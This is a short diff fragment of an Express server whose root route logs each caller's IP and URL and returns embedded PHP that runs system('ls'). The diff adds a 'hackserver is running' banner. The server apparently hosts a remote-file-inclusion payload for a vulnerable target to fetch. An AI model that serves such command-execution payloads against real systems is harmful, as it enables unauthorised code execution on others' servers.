@@ -13,6 +13,7 @@ app.get('/', (req, res, next)=>{
     console.log(req.ip+req.url);
     res.status(200);
     res.send(` 
+        hackserver is running
         <?php 
             echo '<pre>';
             system('ls');
